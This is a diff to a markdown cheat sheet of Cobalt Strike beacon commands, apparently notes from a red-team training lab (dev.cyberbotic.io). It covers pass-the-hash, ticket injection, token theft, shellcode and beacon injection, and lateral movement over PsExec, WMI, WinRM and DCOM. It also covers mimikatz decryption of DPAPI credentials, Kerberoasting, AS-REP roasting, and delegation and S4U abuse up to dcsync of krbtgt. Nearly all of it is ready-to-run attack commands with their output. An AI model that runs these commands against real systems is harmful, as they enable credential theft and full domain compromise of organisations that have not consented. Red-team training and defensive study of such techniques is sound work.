@@ -587,3 +587,357 @@ beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --s
 beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
 beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member
 ```
+
+## User Impersonation
+
+### Pass-the-Hash
+
+```bash
+beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
+# To "drop" impersonation 
+beacon> rev2self
+```
+
+### Pass the Ticket
+
+is a technique that allows you to add Kerberos tickets to an existing logon session (LUID) that you have access to,
+
+> a logon session can only hold a single TGT at a time.
+
+```bash
+# new hidden process createnetonly
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+# or less anomalous
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
+# Import ticket
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
+
+beacon> steal_token 4748
+beacon> rev2self
+beacon> kill 4748
+```
+
+### Overpass the Hash
+
+request a Kerberos TGT for a user
+
+```bash
+# RC4
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap
+# AES256
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap
+# OPSEC
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
+```
+
+### Token Impersonation
+
+> This technique works by obtaining a handle to the target process
+
+```bash
+# List process
+beacon> ps
+PID   PPID  Name                                   Arch  Session     User
+ ---   ----  ----                                   ----  -------     ----
+ 5536  1020  mmc.exe                                x64   0           DEV\jking
+
+# Steal token
+beacon> steal_token 5536
+```
+
+### Token store
+
+This is an evolution on the steal_token command which allows you to steal and store tokens for future use
+
+> The rev2self command will drop the impersonation token, but it will remain in the store so that it can be impersonated again
+
+```bash
+# Steal
+beacon> token-store steal 5536
+# List
+beacon> token-store show
+# Use
+beacon> token-store use 0
+# remove
+beacon> token-store remove <id>
+# remove all
+beacon> token-store remove-all
+```
+
+### Make token
+
+> This also means that `make_token` is not applicable to anything you may want to run on the current machine.  For that, `spawnas` may be a better solution.
+
+
+```bash
+beacon> make_token DEV\jking Qwerty123
+beacon> remote-exec winrm web.dev.cyberbotic.io whoami
+```
+
+### Process Injection
+
+`shinject` allows you to inject any arbitrary shellcode from a binary file on your attacking machine; and `inject` will inject a full Beacon payload for the specified listener.
+
+
+* 4464 is the target PID.
+* x64 is the architecture of the process.
+* tcp-local is the listener name.
+
+
+```bash
+beacon> inject 4464 x64 tcp-local
+```
+
+## Lateral Movement
+
+`jump [method] [target] [listener]`
+
+```bash
+beacon> jump
+
+Beacon Remote Exploits
+======================
+
+    Exploit                   Arch  Description
+    -------                   ----  -----------
+    psexec                    x86   Use a service to run a Service EXE artifact
+    psexec64                  x64   Use a service to run a Service EXE artifact
+    psexec_psh                x86   Use a service to run a PowerShell one-liner
+    winrm                     x86   Run a PowerShell script via WinRM
+    winrm64                   x64   Run a PowerShell script via WinRM
+```
+
+`remote-exec [method] [target] [command]`
+
+```bash
+beacon> remote-exec
+
+Beacon Remote Execute Methods
+=============================
+
+    Methods                         Description
+    -------                         -----------
+    psexec                          Remote execute via Service Control Manager
+    winrm                           Remote execute via WinRM (PowerShell)
+    wmi                             Remote execute via WMI
+```
+
+```bash
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web
+```
+
+### Windows Remote Management (WinRM)
+
+```bash
+beacon> jump winrm64 web.dev.cyberbotic.io smb
+```
+
+### PsExec
+
+```bash
+beacon> jump psexec64 web.dev.cyberbotic.io smb
+# psexec_psh doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit)
+beacon> jump psexec_psh web smb
+```
+
+### Windows Management Instrumentation (WMI)
+
+```bash
+beacon> cd \\web.dev.cyberbotic.io\ADMIN$
+beacon> upload C:\Payloads\smb_x64.exe
+beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
+Started process 3280 on web.dev.cyberbotic.io
+beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
+```
+
+```bash
+# Error
+beacon> make_token DEV\jking Qwerty123
+[+] Impersonated DEV\bfarmer
+
+beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
+CoInitializeSecurity already called. Thread token (if there is one) may not get used
+[-] Could not connect to web.dev.cyberbotic.io: 5
+
+beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"
+```
+
+### DCOM
+
+```bash
+beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
+beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
+# Connect
+beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
+```
+
+## Session Passing
+
+```bash
+beacon> spawn x64 http
+```
+
+### Spawn and Inject
+
+shinject and shspawn.  Both allow you to inject an arbitrary shellcode blob - `shinject` can inject into an existing process, and `shspawn` will spawn a new process.
+
+```bash
+beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
+```
+
+## Data Protection API
+
+> DPAPI is used by the Windows Credential Manager to store saved secrets such as RDP credentials, and by third-party applications like Google Chrome to store website credentials.
+
+### Credential Manager
+
+```bash
+beacon> run vaultcmd /list
+beacon> run vaultcmd /listcreds:"Windows Credentials" /all
+# Seatbelt
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
+```
+
+#### Decrypt
+
+> This will only work if executed in the context of the user who owns the key.  If your Beacon is running as another user or SYSTEM, you must impersonate the target user somehow first, then execute the command using the @ modifier.
+
+```bash
+# Get the master key (ADMIN is required)
+beacon> mimikatz !sekurlsa::dpapi
+# Anothe way
+beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
+# Decrypt
+beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
+```
+
+### Scheduled Task Credentials
+
+Scheduled Tasks can save credentials so that they can run under the context of a user without them having to be logged on
+
+```bash
+beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
+beacon> mimikatz !sekurlsa::dpapi
+beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
+```
+
+## Kerberos
+
+### Kerberoasting
+
+```bash
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
+
+# Select accounts
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
+```
+
+### Asreproast
+
+```bash
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
+```
+
+### Unconstrained Delegation
+
+> Domain Controllers are always permitted for unconstrained delegation.
+
+#### NO Forced Authentication
+
+```bash
+# Find hosts
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
+# show all the tickets that are currently cached
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+# Extract ticket
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
+# start a new logon session
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
+# Steal token
+beacon> steal_token 1540
+```
+
+#### Forced Authentication
+
+> To stop Rubeus, use the `jobs` and `jobkill` commands
+
+```bash
+# Monitor
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
+# Force Dc2=target web=listener
+beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
+# Use ticket
+```
+
+### Constrained Delegation
+
+>   Make sure to always use the FQDN.  Otherwise, you will see 1326 errors.
+
+* `/impersonateuser` is the user we want to impersonate.
+* `/msdsspn` is the service principal name that SQL-2 is allowed to delegate to.
+* `/user` is the principal allowed to perform the delegation.
+* `/ticket` is the TGT for /user.
+
+
+```bash
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+#   You can also request one with Rubeus asktgt if you have NTLM or AES hashes.
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+# Remember that we can impersonate any user in the domain, but we want someone who we know to be a local admin on the target
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
+# New logon session
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
+beacon> steal_token 5540
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+# or
+beacon> jump psexec64 dc-2.dev.cyberbotic.io smb
+```
+
+### Alternate Service Name
+
+We can request a service ticket for a service, such as CIFS, but then modify the SPN to something different, such as LDAP, and the target service will accept it happily.
+
+```bash
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
+beacon> steal_token 2580
+beacon> dcsync dev.cyberbotic.io DEV\krbtgt
+```
+
+### S4U2Self Abuse
+
+> In the Unconstrained Delegation module, we obtained a TGT for the domain controller.  If you tried to pass that ticket into a logon session and use it to access the C$ share (like we would with a user TGT), it would fail. This is because `machines do not get remote local admin access to themselves`.  What we can do instead is abuse S4U2Self to obtain a usable TGS as a user we know is a local admin (e.g. a domain admin).  Rubeus has a /self flag for this purpose.
+
+Possible error
+
+```bash
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj[...]lDLklP
+
+[*] Using DEV\DC-2$:FakePass
+
+[*] Showing process : False
+[*] Username        : DC-2$
+[*] Domain          : DEV
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 2832
+[+] Ticket successfully imported!
+[+] LUID            : 0x4d977f
+
+beacon> steal_token 2832
+
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
+```
+
+```bash
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=
+beacon> steal_token 2664
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+```
